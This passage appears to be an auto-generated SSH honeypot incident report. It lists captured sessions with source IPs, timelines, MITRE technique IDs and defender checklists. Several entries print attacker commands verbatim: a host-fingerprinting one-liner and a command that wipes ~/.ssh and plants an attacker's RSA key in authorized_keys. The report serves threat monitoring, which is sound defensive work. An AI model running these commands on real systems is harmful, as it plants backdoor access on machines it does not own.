| `2026-07-06 13:46:09` | `cowrie.command.input` |
| `2026-07-06 13:46:09` | `cowrie.command.input` |
| `2026-07-06 13:46:09` | `cowrie.command.success` |
| `2026-07-06 13:46:09` | `cowrie.command.input` |
| `2026-07-06 13:46:09` | `cowrie.command.input` |
| `2026-07-06 13:46:09` | `cowrie.command.input` |
| `2026-07-06 13:46:09` | `cowrie.command.input` |
| `2026-07-06 13:46:15` | `cowrie.log.closed` |
| `2026-07-06 13:46:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-171b903af980

| Field | Detail |
|---|---|
| **Source IP** | `34.76.219[.]107` |
| **First Seen** | 2026-07-06 13:46 |
| **Last Seen** | 2026-07-06 13:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:46:18` | `cowrie.session.connect` |
| `2026-07-06 13:46:18` | `cowrie.login.success` |
| `2026-07-06 13:46:19` | `cowrie.session.params` |
| `2026-07-06 13:46:19` | `cowrie.command.input` |
| `2026-07-06 13:46:19` | `cowrie.command.input` |
| `2026-07-06 13:46:19` | `cowrie.command.failed` |
| `2026-07-06 13:46:19` | `cowrie.command.input` |
| `2026-07-06 13:46:19` | `cowrie.log.closed` |
| `2026-07-06 13:46:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.219[.]107` to AbuseIPDB if not already reported
- [ ] Block `34.76.219[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6f6780b429

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 13:46 |
| **Last Seen** | 2026-07-06 13:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:46:22` | `cowrie.session.connect` |
| `2026-07-06 13:46:22` | `cowrie.client.version` |
| `2026-07-06 13:46:22` | `cowrie.client.kex` |
| `2026-07-06 13:46:22` | `cowrie.login.success` |
| `2026-07-06 13:46:22` | `cowrie.direct-tcpip.request` |
| `2026-07-06 13:46:22` | `cowrie.direct-tcpip.data` |
| `2026-07-06 13:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac240dde729e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:46 |
| **Last Seen** | 2026-07-06 13:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:46:23` | `cowrie.session.connect` |
| `2026-07-06 13:46:23` | `cowrie.client.version` |
| `2026-07-06 13:46:23` | `cowrie.client.kex` |
| `2026-07-06 13:46:25` | `cowrie.login.success` |
| `2026-07-06 13:46:26` | `cowrie.session.params` |
| `2026-07-06 13:46:26` | `cowrie.command.input` |
| `2026-07-06 13:46:26` | `cowrie.command.input` |
| `2026-07-06 13:46:26` | `cowrie.command.input` |
| `2026-07-06 13:46:26` | `cowrie.command.input` |
| `2026-07-06 13:46:26` | `cowrie.command.input` |
| `2026-07-06 13:46:26` | `cowrie.command.success` |
| `2026-07-06 13:46:26` | `cowrie.command.input` |
| `2026-07-06 13:46:26` | `cowrie.command.input` |
| `2026-07-06 13:46:26` | `cowrie.command.input` |
| `2026-07-06 13:46:26` | `cowrie.command.input` |
| `2026-07-06 13:46:27` | `cowrie.log.closed` |
| `2026-07-06 13:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f952ba9599af

| Field | Detail |
|---|---|
| **Source IP** | `34.76.219[.]107` |
| **First Seen** | 2026-07-06 13:46 |
| **Last Seen** | 2026-07-06 13:47 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:46:27` | `cowrie.session.connect` |
| `2026-07-06 13:46:27` | `cowrie.login.success` |
| `2026-07-06 13:46:28` | `cowrie.session.params` |
| `2026-07-06 13:46:28` | `cowrie.command.input` |
| `2026-07-06 13:46:28` | `cowrie.command.failed` |
| `2026-07-06 13:47:17` | `cowrie.log.closed` |
| `2026-07-06 13:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.219[.]107` to AbuseIPDB if not already reported
- [ ] Block `34.76.219[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15563de71991

| Field | Detail |
|---|---|
| **Source IP** | `34.76.219[.]107` |
| **First Seen** | 2026-07-06 13:46 |
| **Last Seen** | 2026-07-06 13:47 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:46:29` | `cowrie.session.connect` |
| `2026-07-06 13:46:29` | `cowrie.login.success` |
| `2026-07-06 13:46:29` | `cowrie.session.params` |
| `2026-07-06 13:46:29` | `cowrie.command.input` |
| `2026-07-06 13:47:17` | `cowrie.log.closed` |
| `2026-07-06 13:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.219[.]107` to AbuseIPDB if not already reported
- [ ] Block `34.76.219[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43c17343f10f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:47 |
| **Last Seen** | 2026-07-06 13:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:47:44` | `cowrie.session.connect` |
| `2026-07-06 13:47:45` | `cowrie.client.version` |
| `2026-07-06 13:47:45` | `cowrie.client.kex` |
| `2026-07-06 13:47:47` | `cowrie.login.success` |
| `2026-07-06 13:47:48` | `cowrie.session.params` |
| `2026-07-06 13:47:48` | `cowrie.command.input` |
| `2026-07-06 13:47:48` | `cowrie.command.input` |
| `2026-07-06 13:47:48` | `cowrie.command.input` |
| `2026-07-06 13:47:48` | `cowrie.command.input` |
| `2026-07-06 13:47:48` | `cowrie.command.input` |
| `2026-07-06 13:47:48` | `cowrie.command.success` |
| `2026-07-06 13:47:48` | `cowrie.command.input` |
| `2026-07-06 13:47:48` | `cowrie.command.input` |
| `2026-07-06 13:47:48` | `cowrie.command.input` |
| `2026-07-06 13:47:48` | `cowrie.command.input` |
| `2026-07-06 13:47:49` | `cowrie.log.closed` |
| `2026-07-06 13:47:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e944d097054

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:47 |
| **Last Seen** | 2026-07-06 13:48 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:47:46` | `cowrie.session.connect` |
| `2026-07-06 13:47:52` | `cowrie.client.version` |
| `2026-07-06 13:47:52` | `cowrie.client.kex` |
| `2026-07-06 13:48:12` | `cowrie.login.success` |
| `2026-07-06 13:48:21` | `cowrie.session.params` |
| `2026-07-06 13:48:21` | `cowrie.command.input` |
| `2026-07-06 13:48:21` | `cowrie.command.input` |
| `2026-07-06 13:48:21` | `cowrie.command.input` |
| `2026-07-06 13:48:21` | `cowrie.command.input` |
| `2026-07-06 13:48:21` | `cowrie.command.input` |
| `2026-07-06 13:48:21` | `cowrie.command.success` |
| `2026-07-06 13:48:21` | `cowrie.command.input` |
| `2026-07-06 13:48:21` | `cowrie.command.input` |
| `2026-07-06 13:48:21` | `cowrie.command.input` |
| `2026-07-06 13:48:21` | `cowrie.command.input` |
| `2026-07-06 13:48:26` | `cowrie.log.closed` |
| `2026-07-06 13:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae2f9ff9bd5a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 13:48 |
| **Last Seen** | 2026-07-06 13:48 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:48:00` | `cowrie.session.connect` |
| `2026-07-06 13:48:01` | `cowrie.client.version` |
| `2026-07-06 13:48:01` | `cowrie.client.kex` |
| `2026-07-06 13:48:08` | `cowrie.login.success` |
| `2026-07-06 13:48:12` | `cowrie.session.params` |
| `2026-07-06 13:48:12` | `cowrie.command.input` |
| `2026-07-06 13:48:13` | `cowrie.log.closed` |
| `2026-07-06 13:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-700bc092167d

| Field | Detail |
|---|---|
| **Source IP** | `111.47.243[.]219` |
| **First Seen** | 2026-07-06 13:48 |
| **Last Seen** | 2026-07-06 13:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:48:58` | `cowrie.session.connect` |
| `2026-07-06 13:48:58` | `cowrie.client.version` |
| `2026-07-06 13:48:58` | `cowrie.client.kex` |
| `2026-07-06 13:48:59` | `cowrie.login.success` |
| `2026-07-06 13:49:01` | `cowrie.session.params` |
| `2026-07-06 13:49:01` | `cowrie.command.input` |
| `2026-07-06 13:49:01` | `cowrie.command.failed` |
| `2026-07-06 13:49:01` | `cowrie.log.closed` |
| `2026-07-06 13:49:02` | `cowrie.session.params` |
| `2026-07-06 13:49:02` | `cowrie.command.input` |
| `2026-07-06 13:49:02` | `cowrie.session.file_download` |
| `2026-07-06 13:49:02` | `cowrie.log.closed` |
| `2026-07-06 13:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.47.243[.]219` to AbuseIPDB if not already reported
- [ ] Block `111.47.243[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a46541883b6

| Field | Detail |
|---|---|
| **Source IP** | `111.47.243[.]219` |
| **First Seen** | 2026-07-06 13:49 |
| **Last Seen** | 2026-07-06 13:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:49:03` | `cowrie.session.connect` |
| `2026-07-06 13:49:03` | `cowrie.client.version` |
| `2026-07-06 13:49:03` | `cowrie.client.kex` |
| `2026-07-06 13:49:04` | `cowrie.login.success` |
| `2026-07-06 13:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.47.243[.]219` to AbuseIPDB if not already reported
- [ ] Block `111.47.243[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d13372af8f61

| Field | Detail |
|---|---|
| **Source IP** | `111.47.243[.]219` |
| **First Seen** | 2026-07-06 13:49 |
| **Last Seen** | 2026-07-06 13:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:49:05` | `cowrie.session.connect` |
| `2026-07-06 13:49:05` | `cowrie.client.version` |
| `2026-07-06 13:49:05` | `cowrie.client.kex` |
| `2026-07-06 13:49:06` | `cowrie.login.success` |
| `2026-07-06 13:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.47.243[.]219` to AbuseIPDB if not already reported
- [ ] Block `111.47.243[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05966576a25d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:49 |
| **Last Seen** | 2026-07-06 13:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:49:05` | `cowrie.session.connect` |
| `2026-07-06 13:49:05` | `cowrie.client.version` |
| `2026-07-06 13:49:05` | `cowrie.client.kex` |
| `2026-07-06 13:49:07` | `cowrie.login.success` |
| `2026-07-06 13:49:09` | `cowrie.session.params` |
| `2026-07-06 13:49:09` | `cowrie.command.input` |
| `2026-07-06 13:49:09` | `cowrie.command.input` |
| `2026-07-06 13:49:09` | `cowrie.command.input` |
| `2026-07-06 13:49:09` | `cowrie.command.input` |
| `2026-07-06 13:49:09` | `cowrie.command.input` |
| `2026-07-06 13:49:09` | `cowrie.command.success` |
| `2026-07-06 13:49:09` | `cowrie.command.input` |
| `2026-07-06 13:49:09` | `cowrie.command.input` |
| `2026-07-06 13:49:09` | `cowrie.command.input` |
| `2026-07-06 13:49:09` | `cowrie.command.input` |
| `2026-07-06 13:49:09` | `cowrie.log.closed` |
| `2026-07-06 13:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85286f1cc429

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:49 |
| **Last Seen** | 2026-07-06 13:50 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:49:45` | `cowrie.session.connect` |
| `2026-07-06 13:49:51` | `cowrie.client.version` |
| `2026-07-06 13:49:51` | `cowrie.client.kex` |
| `2026-07-06 13:50:11` | `cowrie.login.success` |
| `2026-07-06 13:50:22` | `cowrie.session.params` |
| `2026-07-06 13:50:22` | `cowrie.command.input` |
| `2026-07-06 13:50:22` | `cowrie.command.input` |
| `2026-07-06 13:50:22` | `cowrie.command.input` |
| `2026-07-06 13:50:22` | `cowrie.command.input` |
| `2026-07-06 13:50:22` | `cowrie.command.input` |
| `2026-07-06 13:50:22` | `cowrie.command.success` |
| `2026-07-06 13:50:22` | `cowrie.command.input` |
| `2026-07-06 13:50:22` | `cowrie.command.input` |
| `2026-07-06 13:50:22` | `cowrie.command.input` |
| `2026-07-06 13:50:22` | `cowrie.command.input` |
| `2026-07-06 13:50:26` | `cowrie.log.closed` |
| `2026-07-06 13:50:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5913d1cff002

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:50 |
| **Last Seen** | 2026-07-06 13:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:50:25` | `cowrie.session.connect` |
| `2026-07-06 13:50:26` | `cowrie.client.version` |
| `2026-07-06 13:50:26` | `cowrie.client.kex` |
| `2026-07-06 13:50:28` | `cowrie.login.success` |
| `2026-07-06 13:50:29` | `cowrie.session.params` |
| `2026-07-06 13:50:29` | `cowrie.command.input` |
| `2026-07-06 13:50:29` | `cowrie.command.input` |
| `2026-07-06 13:50:29` | `cowrie.command.input` |
| `2026-07-06 13:50:29` | `cowrie.command.input` |
| `2026-07-06 13:50:29` | `cowrie.command.input` |
| `2026-07-06 13:50:29` | `cowrie.command.success` |
| `2026-07-06 13:50:29` | `cowrie.command.input` |
| `2026-07-06 13:50:29` | `cowrie.command.input` |
| `2026-07-06 13:50:29` | `cowrie.command.input` |
| `2026-07-06 13:50:29` | `cowrie.command.input` |
| `2026-07-06 13:50:30` | `cowrie.log.closed` |
| `2026-07-06 13:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-349ec8975cff

| Field | Detail |
|---|---|
| **Source IP** | `193.164.155[.]115` |
| **First Seen** | 2026-07-06 13:51 |
| **Last Seen** | 2026-07-06 13:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:51:16` | `cowrie.session.connect` |
| `2026-07-06 13:51:16` | `cowrie.client.version` |
| `2026-07-06 13:51:16` | `cowrie.client.kex` |
| `2026-07-06 13:51:17` | `cowrie.login.success` |
| `2026-07-06 13:51:18` | `cowrie.session.params` |
| `2026-07-06 13:51:18` | `cowrie.command.input` |
| `2026-07-06 13:51:18` | `cowrie.command.failed` |
| `2026-07-06 13:51:18` | `cowrie.log.closed` |
| `2026-07-06 13:51:19` | `cowrie.session.params` |
| `2026-07-06 13:51:19` | `cowrie.command.input` |
| `2026-07-06 13:51:19` | `cowrie.session.file_download` |
| `2026-07-06 13:51:19` | `cowrie.log.closed` |
| `2026-07-06 13:51:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.164.155[.]115` to AbuseIPDB if not already reported
- [ ] Block `193.164.155[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12edc104e0ce

| Field | Detail |
|---|---|
| **Source IP** | `193.164.155[.]115` |
| **First Seen** | 2026-07-06 13:51 |
| **Last Seen** | 2026-07-06 13:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:51:19` | `cowrie.session.connect` |
| `2026-07-06 13:51:19` | `cowrie.client.version` |
| `2026-07-06 13:51:19` | `cowrie.client.kex` |
| `2026-07-06 13:51:20` | `cowrie.login.success` |
| `2026-07-06 13:51:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.164.155[.]115` to AbuseIPDB if not already reported
- [ ] Block `193.164.155[.]115` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed12877227ab

| Field | Detail |
|---|---|
| **Source IP** | `193.164.155[.]115` |
| **First Seen** | 2026-07-06 13:51 |
| **Last Seen** | 2026-07-06 13:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:51:20` | `cowrie.session.connect` |
| `2026-07-06 13:51:20` | `cowrie.client.version` |
| `2026-07-06 13:51:20` | `cowrie.client.kex` |
